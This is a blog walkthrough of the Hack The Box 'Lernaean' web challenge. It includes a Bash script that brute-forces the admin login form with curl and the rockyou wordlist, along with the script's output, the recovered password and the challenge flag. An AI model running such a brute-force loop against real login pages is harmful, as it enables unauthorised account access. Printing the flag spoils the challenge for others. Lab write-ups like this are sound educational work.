# [Grav3m1ndbyte's Resources Blog](/index.html) > [HTB Machine Walkthroughs](/HTB-Machines.html)


![Grav3m1ndbyte HTB Badge](https://www.hackthebox.eu/badge/image/75471)





# Lernaean

![Lernaean Infocard](/images/Lernean.png)

**URL:** http://docker.hackthebox.eu:31027

## Overview

Not much of an "infocard" like with machines but at least you can see what it is about and the host and port to test. 

Basically, this challenge looks to be dynamic at first when you start testing the page. The goal is to try and "guess" the administrator password.


**Let's get started!**

## The Challenge

![Lernaean Page](/images/Lernean_Page.png)

At first glance, it doesn't look like much so I thought of looking at the source code, but not much either except for the password field where you can send a password through a HTTP POST Method. But we know this already!

```
<html>
<head>
    <title>Login - Lernaean</title>
</head>
<body style="background-color: #cd4e7b;">
    <center>
        <br><br><br>
        <h1><u>Administrator Login</u></h1>
        <h2>--- CONFIDENTIAL ---</h2>
        <h2>Please do not try to guess my password!</h2>
        <form method="POST">
            <input type="password" name="password"><br><br>
            <input type="submit" value="Submit">
        </form>
    </center>
</body>
</html>
```

But also, I thought of lookingfor anything interesting in the HTTP Request and Response, but nothing especial.

![Lernaean Page](/images/Lernean_headers.png)

Tried as well a basic SQL Injection but nothing either.

![Lernaean SQLi](/images/Lernean_headers_SQL.png)

![Lernaean SQLi 2](/images/Lernean_headers_SQL2.png)

At this point, I can try with a random passwword even though it didn't give me much above. I tried *test123*, but didn't get anything other than an *Invalid password!* message at the top.

![Lernaean Test 2](/images/Lernean_test_resp2.png)

```
Invalid password!
<html>
<head>
    <title>Login - Lernaean</title>
</head>
<body style="background-color: #cd4e7b;">
    <center>
        <br><br><br>
        <h1><u>Administrator Login</u></h1>
        <h2>--- CONFIDENTIAL ---</h2>
        <h2>Please do not try to guess my password!</h2>
        <form method="POST">
            <input type="password" name="password"><br><br>
            <input type="submit" value="Submit">
        </form>
    </center>
</body>
</html>
```

As you can see, the response didn't changed from before. Right now, I'm scratching my head and can only think of bruteforcing the page. What I'll do instead of relying on a tool, I will write my own Bash Script and see how far I can get to.

## Execution

The script will rely on using Curl and rockyou.txt. Also, the response will be sent to a file and will write over it through each iteration and compare the response against the word 'Invalid' from the previous response.

We know at this point we can send data to the password field in the HTTP Payload, so should be simple.

```
#!/bin/sh

ERROR="Invalid"
for PASS in $(cat /usr/share/wordlists/rockyou.txt)
do
        echo "\n### Testing password $PASS"

        (curl -X POST -d "password=$PASS" -s http://docker.hackthebox.eu:31027) > POST_Respose.txt

        grep -iq $ERROR ./POST_Respose.txt 
        if [ $? -ne 0 ]; then
                echo "\n"
                cat ./POST_Respose.txt
                exit 0;
        else
                echo "\nERROR: Invalid Password!"
        fi
done

```

### Output Snippet:

```
kali@back0ff:~/Documents/HTB-Challenges/Lernean$ ./lernean.sh 

### Testing password 123456

ERROR: Invalid Password!

### Testing password 12345

ERROR: Invalid Password!

### Testing password 123456789

ERROR: Invalid Password!

### Testing password password

ERROR: Invalid Password!

### Testing password iloveyou

ERROR: Invalid Password!

.
.
.

### Testing password nicole1

ERROR: Invalid Password!

### Testing password 12345678910

ERROR: Invalid Password!
```

### Flag:

AND right after testing with *12345678910*, it tests **leonardo** which seems to be the password. See below:

```
### Testing password leonardo


<h1 style='color: #fff;'>HTB{l1k3_4_b0s5_s0n}</h1><script type="text/javascript">
                   window.location = "noooooooope.html"
              </script>
<html>
<head>
    <title>Login - Lernaean</title>
</head>
<body style="background-color: #cd4e7b;">
    <center>
        <br><br><br>
        <h1><u>Administrator Login</u></h1>
        <h2>--- CONFIDENTIAL ---</h2>
        <h2>Please do not try to guess my password!</h2>
        <form method="POST">
            <input type="password" name="password"><br><br>
            <input type="submit" value="Submit">
        </form>
    </center>
</body>
</html>
```

As you notice in the response, we got the flag which is **HTB{l1k3_4_b0s5_s0n}**

Hope you all enjoyed this!





